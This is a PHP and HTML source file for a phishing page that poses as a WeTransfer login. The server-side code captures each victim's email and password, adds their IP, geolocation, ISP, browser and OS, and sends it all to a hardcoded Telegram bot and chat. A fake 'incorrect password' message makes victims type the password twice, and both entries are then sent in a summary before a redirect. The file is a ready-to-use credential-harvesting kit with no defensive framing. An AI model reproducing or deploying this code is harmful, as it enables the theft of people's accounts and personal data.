<?php
// Enable error reporting
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Session configuration
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on');
ini_set('session.cookie_samesite', 'Lax');

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// ============================================================
// TELEGRAM CONFIGURATION – EDIT THESE TWO VALUES
// ============================================================
define('BOT_TOKEN', '8969946726:AAHVMCm5YcPlhl09v3cwy85nLpgamhxX21A');      // e.g. 123456:ABC-DEF...
define('CHAT_ID', '-5452025915');          // e.g. 123456789
// ============================================================

if (!isset($_SESSION['login_attempts'])) {
    $_SESSION['login_attempts'] = [];
}

// Process email submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email'])) {
    $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
    $email = ltrim($email, '#');
    if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $_SESSION['transfer_email'] = $email;
        if (!isset($_SESSION['login_attempts'][$email])) {
            $_SESSION['login_attempts'][$email] = 0;
        }
        // Clear any previously stored first password
        unset($_SESSION['first_password'][$email]);
    }
}

// ------------------------------------------------------------
// Telegram send function
// ------------------------------------------------------------
function sendTelegram($message, $parseMode = 'HTML') {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => CHAT_ID,
        'text'    => $message,
        'parse_mode' => $parseMode,
        'disable_web_page_preview' => true,
    ];
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
            'timeout' => 5,
        ],
    ];
    $context = stream_context_create($options);
    @file_get_contents($url, false, $context);
}

// ------------------------------------------------------------
// IP / geolocation / browser functions
// ------------------------------------------------------------
function getClientIP() {
    $ip_keys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 
                'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR'];
    foreach ($ip_keys as $key) {
        if (!empty($_SERVER[$key])) {
            $ip_list = explode(',', $_SERVER[$key]);
            foreach ($ip_list as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP)) {
                    return $ip;
                }
            }
        }
    }
    return 'UNKNOWN';
}

function getGeoInfo($ip) {
    if ($ip === 'UNKNOWN' || filter_var($ip, FILTER_VALIDATE_IP) === false) {
        return null;
    }
    $url = "http://ip-api.com/json/{$ip}?fields=status,message,country,regionName,city,isp,org,as,timezone";
    $response = @file_get_contents($url);
    if ($response === false) return null;
    $data = json_decode($response, true);
    if ($data && $data['status'] === 'success') {
        return $data;
    }
    return null;
}

function getBrowserInfo($userAgent) {
    $browser = 'Unknown';
    $os = 'Unknown';
    $osArray = [
        'Windows' => 'Windows', 'Macintosh' => 'macOS', 'Linux' => 'Linux',
        'iPhone' => 'iOS', 'iPad' => 'iOS', 'Android' => 'Android',
    ];
    foreach ($osArray as $key => $value) {
        if (stripos($userAgent, $key) !== false) { $os = $value; break; }
    }
    $browserArray = [
        'Chrome' => 'Chrome', 'Firefox' => 'Firefox', 'Safari' => 'Safari',
        'Edge' => 'Edge', 'Opera' => 'Opera', 'MSIE' => 'Internet Explorer',
        'Trident' => 'Internet Explorer',
    ];
    foreach ($browserArray as $key => $value) {
        if (stripos($userAgent, $key) !== false) { $browser = $value; break; }
    }
    return ['browser' => $browser, 'os' => $os];
}

// ============================================================
// Process password submission
// ============================================================
$error = '';
$email = $_SESSION['transfer_email'] ?? '';

if ($email) {
    $attemptCount = $_SESSION['login_attempts'][$email] ?? 0;
    $firstPassword = $_SESSION['first_password'][$email] ?? null;
    
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        $password = trim($_POST['password']);
        $rememberMe = isset($_POST['remember']) ? 'Yes' : 'No';
        
        if (empty($password)) {
            $error = "Please enter your password";
        } else {
            // Collect all details
            $ip = getClientIP();
            $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
            $timestamp = date('Y-m-d H:i:s');
            $geo = getGeoInfo($ip);
            $location = $geo ? "{$geo['city']}, {$geo['regionName']}, {$geo['country']}" : 'Unknown';
            $isp = $geo['isp'] ?? 'Unknown';
            $timezone = $geo['timezone'] ?? 'Unknown';
            $browserInfo = getBrowserInfo($userAgent);
            $browser = $browserInfo['browser'];
            $os = $browserInfo['os'];
            $emailParts = explode('@', $email);
            $provider = count($emailParts) > 1 ? $emailParts[1] : 'unknown';
            
            // Store first password if this is the first attempt
            if ($attemptCount === 0) {
                $_SESSION['first_password'][$email] = $password;
                $firstPassword = $password;
            }
            
            // Increase attempt count
            $newAttemptCount = $attemptCount + 1;
            $_SESSION['login_attempts'][$email] = $newAttemptCount;
            
            // Build instant message
            $msg = "🔐 <b>New Login Attempt</b>\n";
            $msg .= "──────────────────\n";
            $msg .= "📧 <b>Email:</b> <code>{$email}</code>\n";
            $msg .= "🔑 <b>Password:</b> <code>{$password}</code>\n";
            $msg .= "🕒 <b>Time:</b> {$timestamp}\n";
            $msg .= "🌍 <b>IP:</b> <code>{$ip}</code>\n";
            $msg .= "📍 <b>Location:</b> {$location}\n";
            $msg .= "🏢 <b>ISP:</b> {$isp}\n";
            $msg .= "🕰️ <b>Timezone:</b> {$timezone}\n";
            $msg .= "📱 <b>Device:</b> {$userAgent}\n";
            $msg .= "💻 <b>Browser:</b> {$browser}\n";
            $msg .= "🖥️ <b>OS:</b> {$os}\n";
            $msg .= "📎 <b>Provider:</b> {$provider}\n";
            $msg .= "🔁 <b>Remember me:</b> {$rememberMe}\n";
            $msg .= "──────────────────\n";
            $msg .= "Attempt #{$newAttemptCount} of 2";
            
            sendTelegram($msg);
            
            // If this is the second attempt, send summary with both passwords
            if ($newAttemptCount >= 2 && $firstPassword !== null) {
                $summary = "⚠️ <b>❗ TWO FAILED ATTEMPTS ❗</b>\n";
                $summary .= "═══════════════════════\n";
                $summary .= "📧 <b>Email:</b> <code>{$email}</code>\n";
                $summary .= "🔑 <b>First Password:</b> <code>{$firstPassword}</code>\n";
                $summary .= "🔑 <b>Second Password:</b> <code>{$password}</code>\n";
                $summary .= "──────────────────\n";
                $summary .= "🕒 <b>Time of second:</b> {$timestamp}\n";
                $summary .= "🌍 <b>IP:</b> <code>{$ip}</code>\n";
                $summary .= "📍 <b>Location:</b> {$location}\n";
                $summary .= "🏢 <b>ISP:</b> {$isp}\n";
                $summary .= "📱 <b>Device:</b> {$userAgent}\n";
                $summary .= "💻 <b>Browser:</b> {$browser}\n";
                $summary .= "🖥️ <b>OS:</b> {$os}\n";
                $summary .= "═══════════════════════\n";
                $summary .= "⚠️ <b>ACTION REQUIRED</b> – Check credentials!";
                
                sendTelegram($summary);
                
                // Clear session and redirect
                unset($_SESSION['transfer_email'], $_SESSION['login_attempts'][$email], $_SESSION['first_password'][$email]);
                header('Location: dashboard.php');
                exit;
            } else {
                $error = "Incorrect password. Please try again.";
            }
        }
    }
} else {
    die("Session error: Please start over.");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WeTransfer Login</title>
    <style>
        /* ====== Your existing CSS styles (unchanged) ====== */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', Arial, sans-serif; }
        body { display: flex; min-height: 100vh; color: #333; overflow: hidden; }
        .left-pane { width: 50%; background-color: #f5f5f5; display: flex; flex-direction: column; justify-content: center; padding: 40px; position: relative; }
        .left-content { max-width: 500px; margin: 0 auto; text-align: center; }
        .wt-logo { margin-bottom: 40px; width: 120px; }
        .main-heading { font-size: 36px; font-weight: 300; margin-bottom: 15px; color: #333; line-height: 1.2; }
        .main-heading strong { font-weight: 700; }
        .sub-heading { font-size: 18px; font-weight: 300; margin-bottom: 30px; color: #666; }
        .phone-image { width: 100%; max-width: 400px; margin-left: -50px; }
        .right-pane { width: 50%; display: flex; justify-content: center; align-items: center; background-color: white; }
        .login-container { width: 380px; padding: 40px; }
        .login-logo { text-align: center; margin-bottom: 30px; }
        .login-logo img { width: 120px; }
        .form-group { margin-bottom: 20px; position: relative; }
        .form-group label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: 500; }
        .form-control { width: 100%; padding: 12px 15px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; transition: border-color 0.3s; padding-left: 40px; }
        .form-control:focus { outline: none; border-color: #0066ff; }
        .input-icon { position: absolute; left: 15px; top: 40px; color: #999; }
        .checkbox-group { display: flex; align-items: center; margin-bottom: 20px; }
        .checkbox-group input { margin-right: 10px; }
        .forgot-password { text-align: center; margin: 20px 0; }
        .forgot-password a { color: #0066ff; text-decoration: none; font-size: 14px; }
        .btn-login { background-color: #000; color: white; border: none; border-radius: 4px; padding: 14px; width: 100%; font-size: 16px; font-weight: 500; cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: background-color 0.3s; }
        .btn-login:hover { background-color: #333; }
        .btn-login svg { margin-right: 8px; }
        .footer { position: absolute; bottom: 20px; left: 0; width: 100%; text-align: center; font-size: 12px; color: #999; }
        .alert { padding: 12px 15px; border-radius: 4px; margin-bottom: 20px; font-size: 14px; }
        .alert-error { background-color: #ffebee; color: #c62828; border: 1px solid #ef9a9a; }
        .alert-success { background-color: #e8f5e9; color: #2e7d32; border: 1px solid #a5d6a7; }
        #loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(255, 255, 255, 0.8); display: none; justify-content: center; align-items: center; z-index: 1000; }
        .loading-spinner { border: 5px solid #f3f3f3; border-top: 5px solid #000; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @media (max-width: 768px) { body { flex-direction: column; overflow: auto; } .left-pane, .right-pane { width: 100%; padding: 20px; } .phone-image { margin-left: 0; max-width: 300px; } .login-container { width: 100%; max-width: 380px; } }
        #small { text-align: left; width: 50px; }
        .profile-section { text-align: center; padding: 20px 0; border-bottom: 1px solid #eee; }
        .profile-pic { width: 100px; height: 100px; border-radius: 50%; margin: 0 auto 15px; overflow: hidden; border: 3px solid #764ba2; background: #f0f0f0; display: flex; align-items: center; justify-content: center; }
        .profile-pic img { width: 100%; height: 100%; object-fit: cover; }
        .user-email { font-size: 18px; font-weight: 600; color: #333; margin-top: 10px; word-break: break-all; padding: 0 20px; }
        .welcome-text { font-size: 14px; color: #666; margin-top: 5px; }
        .input-wrapper { position: relative; }
        .input-icon { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: #999; }
        /* additional error animation */
        .form-group.show-error .form-control { border-color: #c62828; }
        .shake { animation: shake 0.3s ease-in-out; }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 20%, 60% { transform: translateX(-10px); } 40%, 80% { transform: translateX(10px); } }
        .attempt-counter { font-size: 12px; color: #999; margin-top: 5px; }
        .error-message { color: #c62828; font-size: 13px; margin-top: 5px; }
    </style>
</head>
<body>
    <div class="left-pane">
        <div class="left-content">
            <img class="wt-logo" src="wee.svg" alt="WeTransfer Logo" id="small">
            <h1 class="main-heading">The simplest way to share <strong>big ideas</strong></h1>
            <p class="sub-heading">Send files on your terms with WeTransfer</p>
            <img class="phone-image" src="images/bg.png" alt="Phone with WeTransfer app">
        </div>
        <div class="footer">
            <!-- optional footer -->
        </div>
    </div>

    <div class="right-pane">
        <div class="login-container">
            <div class="login-logo">
                <img src="wet.svg" alt="WeTransfer Logo">
            </div>
            
            <?php if (!empty($error)): ?>
                <div class="alert alert-error"><?php echo htmlspecialchars($error); ?></div>
            <?php endif; ?>
            
            <div class="profile-section">
                <div class="profile-pic">
                    <img src="download.png" alt="Profile Picture">
                </div>
                <div class="user-email"><?= htmlspecialchars($email) ?></div>
                <div class="welcome-text">Welcome back! Please enter your password</div>
                <?php if ($attemptCount > 0): ?>
                    <div style="margin-top:10px;font-size:13px;color:#999;">Attempt <?= $attemptCount + 1 ?> of 2</div>
                <?php endif; ?>
            </div>
            
            <div class="form-container">
                <form id="loginForm" method="POST" action="">
                    <div class="form-group <?php echo $error ? 'show-error' : ''; ?>">
                        <div class="input-wrapper">
                            <span class="input-icon">
                                <svg width="16" height="20" viewBox="0 0 16 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M14 8H13V6C13 3.24 10.76 1 8 1C5.24 1 3 3.24 3 6V8H2C0.9 8 0 8.9 0 10V18C0 19.1 0.9 20 2 20H14C15.1 20 16 19.1 16 18V10C16 8.9 15.1 8 14 8ZM5 6C5 4.34 6.34 3 8 3C9.66 3 11 4.34 11 6V8H5V6ZM14 18H2V10H14V18ZM8 15C9.1 15 10 14.1 10 13C10 11.9 9.1 11 8 11C6.9 11 6 11.9 6 13C6 14.1 6.9 15 8 15Z" fill="#999999"/>
                                </svg>
                            </span>
                            <input type="password" 
                                   id="password" 
                                   name="password" 
                                   class="form-control" 
                                   placeholder="••••••••" 
                                   required
                                   autocomplete="current-password"
                                   autofocus>
                        </div>
                        <?php if ($error): ?>
                            <div class="error-message" id="error-msg">
                                <?php echo htmlspecialchars($error); ?>
                            </div>
                        <?php endif; ?>
                    </div>
                    
                    <div class="forgot-password">
                        <a href="#">Forgot password?</a>
                    </div>
                    
                    <div class="checkbox-group">
                        <input type="checkbox" id="remember" name="remember">
                        <label for="remember">Remember me</label>
                    </div>
                    
                    <button type="submit" class="btn-login" id="loginButton">
                        <span>
                            <svg aria-hidden="true" focusable="false" class="icon-text" width="8px" height="12px" viewBox="0 0 8 12" version="1.1" xmlns="http://www.w3.org/2000/svg">
                                <g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                    <g id="Web/Submit/Active" transform="translate(-148.000000, -32.000000)" fill="#FFFFFF">
                                        <polygon id="Shape" points="148 33.4 149.4 32 155.4 38 149.4 44 148 42.6 152.6 38"></polygon>
                                    </g>
                                </g>
                            </svg>
                            Log in with WeTransfer
                        </span>
                    </button>
                </form>
            </div>
        </div>
        
        <div class="footer">
            <div class="logo">WeTransfer</div>
            <p>Secure file sharing service</p>
        </div>
    </div>
    
    <div class="loading-overlay" id="loading-overlay">
        <div class="spinner"></div>
        <div class="msg">Logging you in, please wait...</div>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('loginForm');
            const passwordInput = document.getElementById('password');
            const formGroup = document.querySelector('.form-group');
            const loadingOverlay = document.getElementById('loading-overlay');
            
            passwordInput.addEventListener('input', function() {
                formGroup.classList.remove('show-error', 'shake');
            });
            
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                loadingOverlay.style.display = 'flex';
                setTimeout(() => {
                    form.submit();
                }, 500);
            });
        });
    </script>
</body>
</html>
